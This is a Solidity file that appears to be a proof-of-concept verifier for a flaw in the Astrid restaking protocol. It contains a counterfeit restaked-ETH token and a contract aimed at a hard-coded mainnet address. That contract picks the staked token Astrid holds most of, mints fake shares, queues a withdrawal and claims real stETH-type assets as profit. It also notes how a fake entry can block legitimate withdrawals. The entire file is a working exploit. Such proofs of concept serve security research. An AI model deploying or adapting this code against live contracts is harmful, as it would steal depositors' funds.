// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IRestakedETHLike is IERC20Minimal {
    function stakedTokenAddress() external view returns (address);
    function scaledBalanceOf(address who) external view returns (uint256);
    function scaledBalanceToBalance(uint256 scaledBalance) external view returns (uint256);
    function mint(address to, uint256 amount) external;
    function burn(address from, uint256 amount) external;
    function rebase(uint256 epoch, bool isRebasePositive, uint256 supplyDelta) external returns (uint256);
}

interface IAstridProtocol {
    function stakedTokens(address stakedToken)
        external
        view
        returns (bool whitelisted, address restakedTokenAddress, address eigenLayerStrategyAddress);

    function totalClaimableWithdrawals(address stakedToken) external view returns (uint256);
    function processWithdrawalsOnWithdraw() external view returns (bool);
    function withdrawalRequestsByUserLength(address withdrawer) external view returns (uint256);
    function withdraw(address restakedTokenAddress, uint256 amount) external;
    function processWithdrawals() external;
    function claim(uint256 withdrawerIndex) external;
}

contract FakeRestakedETH is IRestakedETHLike {
    string public constant name = "Fake Astrid Restaked ETH";
    string public constant symbol = "frETH";
    uint8 public constant decimals = 18;

    address public immutable override stakedTokenAddress;
    address public immutable controller;

    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    constructor(address _stakedTokenAddress, address _controller) {
        stakedTokenAddress = _stakedTokenAddress;
        controller = _controller;
    }

    function scaledBalanceOf(address who) external view override returns (uint256) {
        return balanceOf[who];
    }

    function scaledBalanceToBalance(uint256 scaledBalance) external pure override returns (uint256) {
        return scaledBalance;
    }

    function mint(address to, uint256 amount) external override {
        require(msg.sender == controller, "not controller");
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external override {
        // Astrid trusts this attacker-controlled hook during withdrawal processing.
        _burn(from, amount);
    }

    function rebase(uint256, bool, uint256) external view override returns (uint256) {
        return totalSupply;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (msg.sender != from && allowed != type(uint256).max) {
            require(allowed >= amount, "insufficient allowance");
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function _burn(address from, uint256 amount) internal {
        require(balanceOf[from] >= amount, "insufficient balance");
        unchecked {
            balanceOf[from] -= amount;
            totalSupply -= amount;
        }
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "insufficient balance");
        unchecked {
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }
    }
}

contract FlawVerifier {
    IAstridProtocol internal constant ASTRID =
        IAstridProtocol(0xbAa87546cF87b5De1b0b52353A86792D40b8BA70);

    address internal profitToken_;
    uint256 internal profitAmount_;

    address public selectedStakedToken;
    address public fakeRestakedToken;
    uint256 public selectedAmount;
    uint256 public selectedWithdrawIndex;
    bool public queuedOnly;
    bool public executed;

    // These are pre-existing mainnet LSDs around the fork. The verifier probes them
    // at runtime and only uses a token that Astrid itself has already whitelisted and holds.
    address[] internal candidateStakedTokens = [
        0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, // stETH
        0xBe9895146f7AF43049ca1c1AE358B0541Ea49704, // cbETH
        0xae78736Cd615f374D3085123A210448E74Fc6393, // rETH
        0xac3E018457B222d93114458476f3E3416Abbe38F, // sfrxETH
        0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, // wstETH
        0xE95A203B1a91a908F9B9CE46459d101078c2c3cb, // ankrETH
        0xf951E335afb289353dc249e82926178EaC7DEd78, // swETH
        0xA35b1B31Ce002FBF2058D22F30f95D405200A15b  // ETHx
    ];

    constructor() {}

    function executeOnOpportunity() external {
        if (executed && profitAmount_ > 0) {
            return;
        }

        if (selectedStakedToken == address(0)) {
            _selectTargetToken();
        }
        if (selectedStakedToken == address(0) || selectedAmount == 0) {
            executed = true;
            return;
        }

        if (fakeRestakedToken == address(0)) {
            // Exploit path 0:
            // Deploy a malicious ERC20 that also implements the `IRestakedETH`
            // interface and reports a real `stakedTokenAddress()` already held
            // by Astrid. This preserves the finding's root cause exactly.
            FakeRestakedETH fake = new FakeRestakedETH(selectedStakedToken, address(this));
            fakeRestakedToken = address(fake);
        }

        if (IERC20Minimal(fakeRestakedToken).balanceOf(address(this)) < selectedAmount) {
            // Exploit path 1:
            // Mint the fake restaked token to the attacker, approve Astrid,
            // and call `withdraw()` using only attacker-issued counterfeit
            // balances as backing.
            IRestakedETHLike(fakeRestakedToken).mint(address(this), selectedAmount);
        }

        if (IERC20Minimal(fakeRestakedToken).allowance(address(this), address(ASTRID)) < selectedAmount) {
            IERC20Minimal(fakeRestakedToken).approve(address(ASTRID), type(uint256).max);
        }

        uint256 withdrawerIndexBefore = ASTRID.withdrawalRequestsByUserLength(address(this));

        // Exploit path 2:
        // Queue the malicious withdrawal with `withdraw()`. When Astrid later
        // processes the queue, it trusts attacker-controlled `scaledBalanceOf`,
        // `scaledBalanceToBalance`, `stakedTokenAddress()`, and `burn()` hooks,
        // converting counterfeit shares into claimable real staked assets.
        try ASTRID.withdraw(fakeRestakedToken, selectedAmount) {
            selectedWithdrawIndex = withdrawerIndexBefore;
        } catch {
            executed = true;
            return;
        }

        // If Astrid does not auto-process on withdraw, the attacker can still create the
        // malicious first queue entry and block legitimate withdrawals behind an admin-only step.
        if (!ASTRID.processWithdrawalsOnWithdraw()) {
            queuedOnly = true;

            // This external call is intentionally expected to fail for non-admin callers.
            // It demonstrates the concrete on-chain blocker for profit realization at forks
            // where auto-processing is disabled.
            try ASTRID.processWithdrawals() {} catch {}

            executed = true;
            return;
        }

        uint256 balanceBefore = IERC20Minimal(selectedStakedToken).balanceOf(address(this));

        // Exploit path 3:
        // Call `claim()` on the processed request to receive genuine staked
        // tokens from Astrid. The profit exists only because processing already
        // trusted the attacker's fake `IRestakedETH` hooks and credited this
        // verifier with real assets.
        try ASTRID.claim(selectedWithdrawIndex) {
            uint256 balanceAfter = IERC20Minimal(selectedStakedToken).balanceOf(address(this));
            if (balanceAfter > balanceBefore) {
                profitToken_ = selectedStakedToken;
                profitAmount_ = balanceAfter - balanceBefore;
            }
        } catch {}

        executed = true;
    }

    function profitToken() external view returns (address) {
        return profitToken_;
    }

    function profitAmount() external view returns (uint256) {
        return profitAmount_;
    }

    function candidateCount() external view returns (uint256) {
        return candidateStakedTokens.length;
    }

    function _selectTargetToken() internal {
        uint256 bestAvailable;
        address bestToken;

        for (uint256 i = 0; i < candidateStakedTokens.length; ++i) {
            address stakedToken = candidateStakedTokens[i];

            (bool whitelisted,,) = _safeStakedTokenMapping(stakedToken);
            if (!whitelisted) {
                continue;
            }

            uint256 balance = _safeBalanceOf(stakedToken, address(ASTRID));
            uint256 reserved = _safeTotalClaimable(stakedToken);
            if (balance <= reserved) {
                continue;
            }

            uint256 available = balance - reserved;
            if (available > bestAvailable) {
                bestAvailable = available;
                bestToken = stakedToken;
            }
        }

        selectedStakedToken = bestToken;
        selectedAmount = bestAvailable;
    }

    function _safeStakedTokenMapping(address stakedToken)
        internal
        view
        returns (bool whitelisted, address restakedTokenAddress, address eigenLayerStrategyAddress)
    {
        try ASTRID.stakedTokens(stakedToken) returns (bool w, address r, address e) {
            return (w, r, e);
        } catch {
            return (false, address(0), address(0));
        }
    }

    function _safeTotalClaimable(address stakedToken) internal view returns (uint256) {
        try ASTRID.totalClaimableWithdrawals(stakedToken) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256) {
        try IERC20Minimal(token).balanceOf(account) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }
}

